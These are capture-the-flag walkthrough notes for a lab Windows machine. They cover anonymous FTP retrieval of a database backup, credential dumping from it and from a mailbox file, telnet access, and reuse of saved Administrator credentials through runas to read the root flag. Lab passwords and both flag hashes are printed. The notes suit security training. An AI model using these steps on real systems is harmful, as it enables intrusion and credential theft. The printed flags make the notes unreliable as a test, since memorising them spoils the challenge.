User
	Command1
		```sh
		ftp Anonymous@{IP}
		binary
		cd Backups
		get backup.mdb
		cd ..\Engineer\Control.zip
		exit
		sudo apt install mdbtools
		mdb-tables backup.mdb
		mdb-json backup.mdb auth_user```
	Creds:
		{"id":25,"username":"admin","password":"admin","Status":1,"last_login":"08/23/18 21:11:47","RoleID":26}
		{"id":27,"username":"engineer","password":"access4u@security","Status":1,"last_login":"08/23/18 21:13:36","RoleID":26}
		{"id":28,"username":"backup_admin","password":"admin","Status":1,"last_login":"08/23/18 21:14:02","RoleID":26}
	{EXTRACT THE DB w/ PWD}
	Command2
		```sh
		sudo apt install pst-utils
		readpst Access\ Control.pst```
	{OPEN THE RESULTING MBOX FILE}
	Access Control.mbox
		The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
	USER CREDS:
		user:
			security
		password:
			4Cc3ssC0ntr0ller
	PWN:
		```sh
		telnet 10.129.228.89
		type Desktop\user.txt```
		261a54a9014df6fb3dbd2138a51f318f

Root
	COMMAND1:
		```sh
		telnet 10.129.228.89
		cd C:\Users\Public\Desktop\
		type type "ZKAccess3.5 Security System.lnk"
		#THIS FINDS YOU user:ACCESS\Administrator
		runas /user:ACCESS\Administrator /savecred "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\security\Videos\root.txt"```
	PWN:
		```sh
		type C:\Users\security\Videos\root.txt```
		98e0763999f64f9437585bd74ec90b97